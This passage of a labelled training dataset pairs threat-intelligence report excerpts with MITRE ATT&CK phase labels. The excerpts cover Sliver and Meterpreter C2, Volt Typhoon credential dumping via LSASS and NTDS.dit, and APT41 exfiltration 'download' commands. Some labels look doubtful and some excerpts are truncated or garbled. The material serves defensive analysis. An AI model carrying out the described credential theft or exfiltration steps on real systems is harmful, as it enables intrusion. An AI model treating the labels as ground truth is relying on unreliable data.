        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Meterpreter\nMeterpreter history included the following PowerShell reverse shell:\nThis shell is the same that was documented in:\nFrom the Meterpreter history, we can see the following commands were used:\nS0633  Sliver\nAnalyzing the local Sliver DB (.sliver/sliver.db), we can extract the C2 endpoint and active implants.\nWe can query the beacons table to get a list of the compromised hosts and the associated command and control server endpoint:\nIn the database we observed 66 beacons connecting to the server. From these connected beacons, we derived the following dwell time statistics.\nBeacons with a minimum time of zero seconds indicate the the beacon failed, perhaps because the attack was unsuccessful. For other beacons we observed indications that the threat actor was testing the beacon. When reviewing the 66 beacons only 16 of them had an active time of more than five minutes.\nThe Sliver multiplayer port 31337 is exposed on 192.169.6.122 as seen by Shodan:\nIn ourThreat Intel servicestracking the following data was observed. We first picked up the server as hosting a Sliver team server on 2022-11-16.  We continued to observe it until 2023-02-13. After that we picked it up again for Sliver activity on 2023-10-09. The server remains active in our dataset through the date of publication.\nS0154  Cobalt Strike\nWhile we didn't observe the threat actor actively use Cobalt Strike, a copy of v4.7 was found in the opendir. The server logs recorded one login on 10 Apr 2023 from 45.56.162.100 :\nThe md5 of the license file cobaltstrike.auth was 0c5ede28df39341763d16961a118625d.\nWhen using the authkey.pub to decrypt the .auth file, the following results were returned:\nThe watermark associated with the kit is 0x175065ea (391144938) which is associated with cracked versions.\nT1572 Protocol Tunneling\nThe threat actor used the Meterpreter module portfwd to establish a reverse port forward with the C2 IP:\nWe also observed in the sliver-client.log where they used netcat:\nThe toolgostwas found in the root of the open directory. While we didn't observe the use of this tool, it can be used to create a proxy between victim and threat actor.\nT1090.003 Multi-hop Proxy\nThe threat actor regularly made use of torify to proxy activity via the TOR network.\nSliver Operator names\nThe Sliver database ./.sliver/sliver.db included the names and tokens of the operators on the Sliver server.\nT1583.001 Acquire Infrastructure  Domains\nThe domain smilevolume[.]com was registered in December 2021 via NameCheap. The domain apicalls[.]net was registered in September 2022 and is masked.\nThere were 6 IPs recorded in ./ssh/known_hosts :\nPivoting on the SSH Fingerprint, there are 12 additional IPs matching the search on Shodan:\nThe threat actor established dynamic port forwarding with proxy hosts for multiple tooling.\nThe IP 103.174.104.51 used to proxy traffic is a Mikrotik router in India:\nThe last entry (as well as another IP observed in the known hosts file) indicate the threat actor was using a SSH VPN service  vpnjantit[.]com to hide some of the traffic. The default SSH username for vpnjantit[.]com is the service login with the \"-vpnjantit[.]com\" added to the end according to the site's documentation. This indicates the username used for the vpnjantit[.]com service was 'pareshraval'.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In most cases, PowerShell is used to download tools to compromised systems including BazarLoader to assist in reconnaissance. The attackers then enable RDP via registry to enable remote access. After gaining initial access, the attackers usually deploy ConnectWise (formerly known as ScreenConnect), a legitimate remote access tool.\nIn order to perform lateral movement and identify systems of interest, such as the victim's Active Directory server, the attackers deploy Adfind, a free tool that can be used to query Active Directory, and SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for discovery of hostnames and network services.\nThe next phase of the attack is credential theft and the attackers use a wide range of credential-stealing tools, including:\nGrabFF: A tool that can dump passwords from Firefox\nGrabChrome: A tool that can dump passwords from Chrome\nBrowserPassView: A tool that can dump passwords from Internet Explorer and a number of other browsers\nAlong with these tools, the attackers also use a number of open-source tools such as KeeThief, a PowerShell script to copy the master key from KeePass. In some cases, customized versions of open-source credential-dumping tools were also observed (secretsdump.exe). Credentials were also dumped from the registry.\nIn addition, the attackers have also used a number of other data capture tools, including a screen capture tool and a file exfiltration tool (filegrab.exe). Cobalt Strike Beacon was also deployed against at least one targeted organization.\nOther tools used include ProxifierPE, which can be used to proxy connections back to attacker-controlled infrastructure, and the free, Chromium-based Cent web browser.",
        "output": "lateral movement",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On July 11, 2023, Microsoft published two blogs detailing a malicious campaign by a threat actor tracked as Storm-0558 that targeted customer email that we've detected and mitigated: Microsoft Security Response Center and Microsoft on the Issues. As we continue our investigation into this incident and deploy defense in depth measures to harden all systems involved, we're providing this deeper analysis of the observed actor techniques for obtaining unauthorized access to email data, tools, and unique infrastructure characteristics. \nSeptember 6, 2023 update \u2013 Microsoft has completed a comprehensive technical investigation into Storm- $.0558^{\\prime}s$ acquisition of the Microsoft account consumer signing key. Investigation findings are released on the Microsoft Security Response Center blog: Results of major technical investigations for Storm-0558 key acquisition. \nAugust 2024 update \u2013 Microsoft now tracks Storm-0558 as Antique Typhoon. \nAs described in more detail in our July 11 blogs, Storm-0558 is a China-based threat actor with espionage objectives. Beginning May 15, 2023, Storm-0558 used forged authentication tokens to access user email from approximately 25 organizations, including government agencies and related consumer accounts in the public cloud. No other environment was impacted. Microsoft has successfully blocked this campaign from Storm-0558. As with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. \nSince identification of this malicious campaign on June 16, 2023, Microsoft has identified the root cause, established durable tracking of the campaign, disrupted malicious activities, hardened the environment, notified every impacted customer, and coordinated with multiple government entities. We continue to investigate and monitor the situation and will take additional steps to protect customers. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory. Conti deployments using a DLL seem to have first started showing up in December 2020.\nSome traces of this particular DLL were found in the memory dump taken from one of the compromised systems.\nWe were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out. The Yara rule, located in the detections section below was made possible due to him reconstructing the DLL. Thanks Maxime!\nConti scans the network for 445/SMB, looking for machines to encrypt.\nRansom note\nWhich leads you here.\nThe threat actors asked for 150k and could have been talked down at least ~20%.\nMultiple machines within the environment were not usable after being ransomed including a domain controller. The machines were left like this and you were not able to do anything but press control+alt+delete. Paying the ransom will not help you here.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Emotet Execution\nThe execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll . Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.\nA new file is then created in C:\\%USERPROFILE%\\AppData\\Local\\ with a folder that also consists of random characters.\nCobalt Strike Execution\nThe Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.\nSysmon showing Emotet starting the Cobalt Strike executable.\nA great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens's fantastic tool1768.py. Here, the tool is used with a process dump of the executable.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access was via a OneDrive link that arrived via malicious emails that was reported via@ankit_anubhav.\nUpon accessing the link, a zip file was downloaded.\nThe original URL of the file can be traced from the file stream log data (Sysmon Event ID 15) as well.\nReviewing the file stream data from Sysmon we can see that the zip contains an ISO file.\nTheAnalystreported similar BazarLoader activity via malicious emails around the same time frame.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Data that was collected from the domain was exfiltrated to a remote server at:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor dropped and executed two batch scripts, up.bat and 1.bat, remotely using PsExec on targeted servers to perform various operations.\nThe up.bat script was executed remotely on a domain controller using the following command:\nThe script contained a one liner to reset the password to a privileged service account:\nThe threat actor executed the following command to remotely copy the ransomware binary to the target machines before running the second batch script:\nThe second script, 1.bat, was then executed on multiple hosts using the following command:\nThe script contained the following commands:\nThe above commands were meant to preform the following operations:\nThe first command uses bcdedit utility to modify and set the default boot configuration of the system to the \"safe mode with networking\". \nThe second command is using findstr to check if the previous command executed successfully. \nThe following reg commands are used to modify the registry and enable automatic logon using the service account, and add the ransomware binary <REDACTED-COMPANY-NAME>.exe to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce to be executed on system's start up. \nThe last commands are used to initiate an immediate system restart after a 10 second delay.\nThe ransomware binary <REDACTED-COMPANY-NAME>.exe executed multiple files and utilities, below are the child and grand child processes showing the behavior of this ransomware binary:\nThe threat actor executed the binary example.exe which configured the ransomware, cleared logs and deleted volume shadow copies.\nThe ransomware options were dissected inNetscope's BlackCat Ransomware: Tactics and Techniques From a Targeted Attackblog post.\nUpon the execution of these utilities, the binary started encrypting files and dropping the ransom note:",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This case starts with an initial tweet by '@crep1x' on X, showing thefollowing:\nFigure 01  initial tweet, mentioning the domain 'zoommanager[.]com\nUpon visiting zoommanager[.]com, the user was greeted with a cloned Zoom web page, offering the user to install Zoom, a popular teleconferencing tool.\nFigure 02  Initial Malicious Zoom via zoommanager[.]com\nUpon pressing the 'Download' button, the victim downloads a malicious binaryZoom_v_2.00.4.exe\nThe manner in which the victim arrived at this page was unclear in this case. Well-established methods for distribution include malicious advertising, such as in the 'ads' section of a Google search for terms like 'Zoom', or through access brokers who set up lures for popular tools to trick the victim into downloading the malware.\nThe cloned webpage was only slightly modified to include a small function at the top, loadlink(), which triggers a backend PHP script located at ./download/dwnl.php. This script was added as an on-click event to some of the 'Download' buttons.\nThe threat actor didn't replace all the links, as most links were still redirected to the legitimate Zoom domain. Also, some of the 'download' related functionality had not been replaced and was still referencing the legitimate Zoom page:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ae5d0ad47328b85e4876706c95d785a3c1387a11f9336844c39e75c7504ba365 \u2013 Ligolo\ne0873e15c7fb848c1be8dc742481b40f9887f8152469908c9d65930e0641aa6b \u2013 Ligolo\n22e7528e56dffaa26cfe722994655686c90824b13eb51184abfe44d4e95d473f \u2013 Hidec\nb0b97c630c153bde90ffeefc4ab79e76aaf2f4fd73b8a242db56cc27920c5a27 \u2013 Nping\nb15dcb62dee1a8499b8ac63064a282a06abf0f7d0302c5e356cdb0c7b78415a9 \u2013 LSASS Dumper\n61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2 \u2013 SharpChisel\nccdddd1ebf3c5de2e68b4dcb8fbc7d4ed32e8f39f6fdf71ac022a7b4d0aa4131 \u2013 Password Dumper\nfacb00c8dc1b7ed209507d7c56d18b2c542c4e0b2986b9bfaf1764d8e252576b \u2013 CrackMapExec\n1a107c3ece1880cbbdc0a6c0817624b0dd033b02ebaf7fa366306aaca22c103d \u2013 ProcDump\n916cc8d6bf2282ae0d2db587f4f96780af59e685a1f1a511e0b2b276669dc802 \u2013 ProcDump\ne2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496 \u2013 ProcDump\nf6600e5d5c91ed30d8203ef2bd173ed0bc431453a31c03bc363b89f77e50d4c5 - SOCKS5 proxy server\n6d73c0bcdf1274aeb13e5ba85ab83ec00345d3b7f3bb861d1585be1f6ccda0c5 \u2013 Keylogger\n912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 \u2013 Mimikatz\n96632f716df30af567da00d3624e245d162d0a05ac4b4e7cbadf63f04ca8d3da \u2013 Mimikatz\nbee3d0ac0967389571ea8e3a8c0502306b3dbf009e8155f00a2829417ac079fc \u2013 Mimikatz\nd9770865ea739a8f1702a2651538f4f4de2d92888d188d8ace2c79936f9c2688 - Mimikatz",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $\\$1$ USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots. The Library/Application Support/com.apple.iCloud.sync.daemon directory is used to keep the icloudsyncd executable. This directory will also contain the process id of the running malware in process.id and a \"build name\" (as it is called by the author) in build.id. With administrator privileges, it will also change the owner of icloudsyncd to root:admin and make the executable setuid and setgid, which means it will always run as root in the future. \nps ax on an infected system: ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Review all EC2 Instances, and ensure User Data Scripts for EC2s do not contain cleartext secrets or sensitive data \nUser Data Scripts are a set of commands that you provide during the launch of the EC2. \nThe User Data Scripts are performed using root permissions, and it can be viewed via IMDS. An attacker can read the script being ran by a simple curl command. \ncurl http://169.254.169.25 \nLimit the number of HTTP Put Response Hops (minimum value is defaulted to 1 and the maximum is 64). \nThe following example limits the maximum number of hops that occurs to 1: \n{ \"Version\": \"2012-10-17\", \"Statement\": { \n\"Sid\": \"MaxImdsHopLimit\", \"Effect\": \"Deny\", \"Action\": \"ec2:RunInstances\", \"Resource\": \"arn:aws:ec2:\\*:\\*:insta \"Condition\": { \"NumericLessThanEquals\": {\"ec2:MetadataHttpPutResponseH } } } \nLimit API Calls to use IMDSv2 to deliver the Amazon EC2 Role credentials via an IAM Policy \n\"Version\": \"2012-10-17\", \"Statement\": { \"Sid\": \"RequireAllEc2RolesToUseV2\", \"Effect\": \"Deny\", \"Action\": \"\\*\", \"Resource\": \"\\*\" \"Condition\": { \"NumericLessThan\": {\"ec2:RoleDelivery\": \"2.0\"} } } } \nLimit access to be able to modify the EC2 Instance metadata service \n{ \"Version\": \"2012-10-17\", \"Statement\": { \n\"Sid\": \"LimitModifyInstanceMetadat \"Effect\": \"Deny\", \"Action\": \"ec2:ModifyInstanceMetada \"Resource\": \"\\*\", \"Condition\": { \"StringNotLike\": {\"aws:PrincipalARN\": \"arn:aws:i } } } \nRestrict the scope of IAM role / credential access to S3 buckets   \n\uedd9 Block or reduce of IAM role / credential usage ability from the public Internet   \nLimit server Internet egress to prevent outbound server traffic   \nImplement S3 Bucket Policies to further restrict access to the S3 Bucket   \nEnable VPC flows and S3 bucket / object level access data events   \nProxy or monitor web requests for possible exploitation   \nLimit service ports allowed inbound or outbound to the server   \nSanitize or limit unnecessary HTTP headers to the web server   \nLog all the things, and prioritize alerting for possible credential abuse   \nFollow Amazon Web Services best practices for solutions, and regularly test security controls ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Before initiating the exfiltration process, a custom tool called confucius_cpp.exe was dropped on a file server. This tool was used to aggregate, stage, and compress sensitive data files, using LDAP and creating multiple ZIP archives.\nAs seen when executing the tool in a lab environment, the LDAP query with search filter (&(objectClass=computer)) is first made to look for computers, as documented inMicrosoft learn website.\nOnce the LDAP query is complete, the tool enumerates shared folders, filtering out some uninteresting folders such as NETLOGON or SYSVOL.\nOn each selected folder, the tool will look for files based on keywords (in the screenshot they're after the wordssecurity_reportsandfinance) before compressing data. This automates the collection phase, ensuring swift action across the whole network.\nThe attacker also installed Firefox to preview a few documents. This can be seen by looking at the process command line, which contains the url argument, as displayed below.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1021 Remote ServicesT1021.001 Remote Desktop Protocol\nBlog Contact sales Get started for free T1021.005 VNC T1021.006 Windows Remote Management T1021.007 Cloud Services T1219 Remote Access Software T1550 Use Alternate Authentication Material T1550.002 Pass the Hash T1563 Remote Service Session Hijacking T1563.002 RDP Hijacking T1570 Lateral Tool Transfer ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This attacker often leverages compromised credentials of administrators or other privileged accounts for initial access. A common tactic employed by this attacker involves SMS phishing privileged users, SIM swapping, and then impersonating the users to trick help desk agents into sending a multifactor reset code via SMS. Mandiant currently doesn't have enough data to determine how the attacker conducts the SIM swaps. ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Symantec has found an extensive command-and-control (C&C) infrastructure supporting Regin infections. The attackers have devised a complex system for communication with C&C servers, in which traffic is relayed through a network of Regin-infected computers. Compromised computers can act as a proxy for other infected computers and peer-to-peer (P2P) communications are used. The networking protocols used by the malware are extensible and can be configured between each pair of Regin-infected computers, providing the attackers with a granular level of control over C&C communications.\nAll C&C communications use strong encryption and follow a two-stage protocol, where the attackers contact the infected computer on one channel and instruct it to open communications on another. A single Regin module (0009h) is responsible for the core handling of communications protocols, while each individual protocol has its own separate module. A total of six transport protocols have been identified: ICMP, UDP, TCP, HTTP Cookies, SSL, and SMB.\nRegin's P2P communications capability sees each Regin infection assigned a virtual IP address, forming a virtual private network (VPN) on top of the physical network of the infected computer. This P2P capability allows the attackers to maintain deep access to critical assets within compromised organizations and mask core infrastructure belonging to the group. Traffic between nodes can be configured to match expected protocols based on where the nodes are placed on a network, adding a further degree of stealth to communications.",
        "output": "command and control",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exfiltration Over C2 Channel  T1041 \nAt the exfiltration stage, APT41 gained access to various server configurations, backup data, and user data. The group most likely did not exfiltrate a large amount of confidential documents. \ndownload D:\\projects\\{redacted}\\web.config; download D:\\projects\\{redacted}\\css\\help.txt; download D:\\System Volume Information\\002.dat; download D:\\projects\\   \n{redacted}\\Web.config; download D:\\{redacted}\\{redacted}20210301120008.txt; download c:\\ftpcmd.dat; download c:\\AppTextFile.txt; download   \nc:\\Users\\Administrator\\Desktop\\OfcNTCer.dat; download c:\\Users\\   \n{redacted}\\Desktop\\172.16.11.103.png; download c:\\Users\\{redacted}\\Desktop\\FTP   \nbatch\\ftp_servername.bat; download c:\\Users\\{redacted}\\Desktop\\FTP batch\\[redacted].bat; download c:\\Users\\{redacted}\\Desktop\\tm remote chat.txt; download c:\\Temp\\netstat.txt; download c:\\Program Files (x86)\\Trend Micro\\OfficeScan\\PCCSRV\\Admin\\web.config; download c:\\Program Files (x86)\\Trend \nMicro\\OfficeScan\\PCCSRV\\Admin\\Utility\\SQL\\web.config; download c:\\Program Files (x86)\\Trend Micro\\OfficeScan\\PCCSRV\\Web\\web.config; download c:\\Program Files (x86)\\Trend \nMicro\\OfficeScan\\PCCSRV\\Web_OSCE\\Web_console\\HTML\\widget_old\\repository\\inc\\class ; download \nc:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ASP.NETWebAdminFiles\\web.config; download c:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\CONFIG\\web.config; download c:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ASP.NETWebAdminFiles\\web.config; download c:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\CONFIG\\web.config; download c:\\Windows\\WinSxS\\amd64_clientdeploymentconnectsite_31bf3856ad364e35_10.0.14393.0_none_d2443e4100c72a7c\\web.config; download c:\\Users\\{redacted}\\Desktop\\Office Scan Backup\\Private\\AosBackup.txt ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP was used to access the environment, as well as move within the environment.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon actors gain access to target environments, they use hands-on-keyboard activity via the command-line [T1059] and other native tools and processes on systems [T1218] (often referred to as \"LOLBins\"), known as LOTL, to maintain and expand access to the victim networks. According to industry reporting, some \"commands appear to be exploratory or experimental, as the operators [i.e., malicious actors] adjust and repeat them multiple times.\"[2] \nFor more details on LOTL activity, see the Credential Access and Discovery sections and Appendix A: Volt Typhoon LOTL Activity. \nSimilar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded [T1105] an outdated version of comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory [T1003.001] and obtain credentials (LSASS process memory space contains hashes for the current user's operating system (OS) credentials). \nThe actors also use legitimate non-native network admin and forensic tools. For example, Volt Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed implanting Fast Reverse Proxy (FRP) for command and control.[3] (See the Command and Control section). ",
        "output": "execution",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon primarily relies on valid credentials for persistence [T1078]. \nDefense Evasion \nVolt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion [TA0005], which allows them to camouflage their malicious activity with typical system and network behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see joint guide Identifying and Mitigating Living off the Land Techniques. \nVolt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the commandline port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX) [T1027.002]. FRP client applications support encryption, compression, and easy token authentication and work across multiple protocols-including transmission control protocol (TCP), user datagram protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). The FRP client applications use the Kuai connection protocol (KCP) for error-checked and anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information. \nIn addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively clearing Windows Event Logs [T1070.001], system logs, and other technical artifacts to remove evidence [T1070.009] of their intrusion activity and masquerading file names [T1036.005]. \nCredential Access \nVolt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities [T1068] in the operating system or network services. \nIn some cases, they have obtained credentials insecurely stored on the appliance [T1552]. In one instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt Typhoon actors compromised a domain admin account stored inappropriately on the device. \nVolt Typhoon also consistently obtains valid credentials by extracting the Active Directory database file (NTDS.dit)-in some cases multiple times from the same victim over long periods [T1003.003]. NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, essentially allowing for full domain compromise if the hashes can be cracked offline. \nTo obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon: \n1. Move laterally [TA0008] to the domain controller via an interactive RDP session using a compromised account with domain administrator privileges [T1021.001];   \n2. Execute the Windows-native vssadmin [T1006] command to create a volume shadow copy;   \n3. Use Windows Management Instrumentation Console (WMIC) commands [T1047] to execute ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume shadow copy; and   \n4. Exfiltrate [TA0010] NTDS.dit and SYSTEM registry hive to crack passwords offline) [T1110.002]. (For more details, including specific commands used, see Appendix A: Volt Typhoon LOTL Activity.) Note: A volume shadow copy contains a copy of all the files and folders that exist on the specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file. \nVolt Typhoon actors have also been observed interacting with a PuTTY application by enumerating existing stored sessions [T1012]. Given this interaction and the exposure of cleartext-stored proxy passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY profiles that allow access to critical systems (see the Lateral Movement section). \nAccording to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS (see Appendix B for commands used).[2] \nThe U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2] \n\u2022 Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run Mimikatz after leveraging a compromised administrator account to deploy it. Impacket is an open source Python toolkit for programmatically constructing and manipulating network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks-as well as remote service execution. \nDiscovery \nVolt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances already present on the system for system information [T1082], network service [T1046], group [T1069] and user [T1033] discovery. ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA currently has no evidence of data exfiltration from this threat actor but assesses that it was likely due to the use of 7-Zip and viewing of sensitive documents. ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space namedMEGA. The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.\nThe use of RClone continues to be an effective tool for bulk data exfiltration. NCC Group has provided adetailed write-upof the Rclone application and detection methods.\nThe Rclone activity was observed on two separate instances, each lasting around three hours and occurring between 1900 and 2200 UTC.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first stage of any attack is reconnaissance, as part of which threat actors use a wide range of techniques to collect data about the target organization. They can be divided into two categories: active and passive scanning. Below is a list of tools used by APT41 from both categories: \nActive scanning. T.1595: \nAcunetix vulnerability scanner \nNmap network scanner \nUtilities for brute-forcing directories on web servers: OneForAll, subdomain3, subDomainsBrute, Sublist3r \nJexBoss, a tool for searching for and exploiting vulnerabilities in Jbos and other Java applications \nPassive scanning. Search Open Technical Databases: Scan Databases T1596.005: \nfofa.su (a Chinese equivalent of shodan.io) scans the Internet and collects information about open ports and services running on them, which enables attackers to determine their targets and conduct attacks more effectively. ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Sqlmap\nThe threat actor usedsqlmapto compromise various websites:\nBelow is one of the many commands the threat actor ran to dump tables from a Pharmaceutical organization in South Korea:\nSeeyon_exp\nThe scriptseeyon_expwas used to upload JSPX web sells to several sites by exploiting a component in the softwareZhiyuan OA.\nThe results that were left behind by the threat actor provided evidence of the web shells from the successful exploitation:\nTranslated we can see the confirmation of what was successful with each target.\nWeaver\nAnother toolweaverwas also used to scan for vulnerabilities and exploitZhiyuan OAinstances.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1098: Account ManipulationT1136: Create AccountT1136.001: Local AccountT1543.003: Windows ServiceT1547.001: Registry Run Keys / Startup FolderT1547.009: Shortcut Modification ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LAPSUS\\$'s action on objectives appears to focus on data exfiltration of sensitive information as well as destruction or disruption. In one particular incident the threat actor is observed to utilise the free file drop service \"filetransfer[.]io\". ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
